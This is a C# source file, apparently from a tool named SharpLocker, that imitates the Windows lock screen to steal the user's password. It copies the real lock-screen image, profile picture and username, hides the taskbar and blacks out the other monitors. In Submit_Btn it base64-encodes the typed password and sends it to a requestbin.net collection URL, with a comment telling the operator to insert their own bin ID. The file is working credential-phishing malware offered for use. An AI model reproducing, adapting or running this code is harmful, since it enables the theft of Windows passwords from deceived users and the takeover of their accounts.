using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;
using Microsoft.Win32;
using System.IO;
using SharpLocker.Core;
using SharpLocker.SharpLocker;


namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        public LockScreenForm()
        {
            InitializeComponent();
            Taskbar.Hide();
            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Image myimage = User.GetLockScreenImage();
          
            BackgroundImage = myimage;
            BackgroundImageLayout = ImageLayout.Stretch;
            this.TopMost = true;
            string userName = System.Environment.UserName.ToString();
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = System.Drawing.Color.Transparent;

            int percentHeight = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100);
            int middleWidth = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width) / 2);
            int tbsize = 28;
            int tbwidth = 200;

            // Profile Icon
            ProfileIcon = new CustomPictureBox()
            {
                InterpolationMode = InterpolationMode.HighQualityBilinear,
                SmoothingMode = SmoothingMode.AntiAlias,
                Top = percentHeight * 17,
                Left = middleWidth - 100,
                Image = User.GetProfileImage(),
            };

            using (var gp = new GraphicsPath())
            {
                gp.AddEllipse(new Rectangle(0, 0, ProfileIcon.Width - 1, ProfileIcon.Height - 1));
                ProfileIcon.Region = new Region(gp);
            }


            // Username
            UserNameLabel.Top = percentHeight * 51;
            UserNameLabel.Left = middleWidth - 201;

            SubmitPasswordButton.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            SubmitPasswordButton.Left = middleWidth + (tbwidth / 2) - 11;

            show.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            show.Left = middleWidth + (tbwidth / 2) - 45;

            PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
            PasswordTextBox.Size = new System.Drawing.Size(tbwidth - 4, Convert.ToInt32(tbsize));
            PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;

            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)),
            Convert.ToInt32(tbsize * 1.25));

            power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
            power.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            accessibility.Left = Screen.PrimaryScreen.Bounds.Width - 110;
            accessibility.Top = Screen.PrimaryScreen.Bounds.Height - 60;


            foreach (var screen in Screen.AllScreens)
            {

                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }

        }



        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == true)
                {


                }

                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
        }

        private void Submit_Btn(object sender, EventArgs e)
        {
            byte[] byt = System.Text.Encoding.UTF8.GetBytes(PasswordTextBox.Text);
            var base64 = Convert.ToBase64String(byt);

            // Get your own requestbin ID and change the "x".
            HttpWebRequest req = (HttpWebRequest) WebRequest.Create("http://requestbin.net/r/xxxxxxxx?" + base64);
            req.GetResponse();

            Taskbar.Show();
            System.Windows.Forms.Application.Exit();
        }

        private void LockScreenForm_Load(object sender, EventArgs e)
        {

        }
    }
}
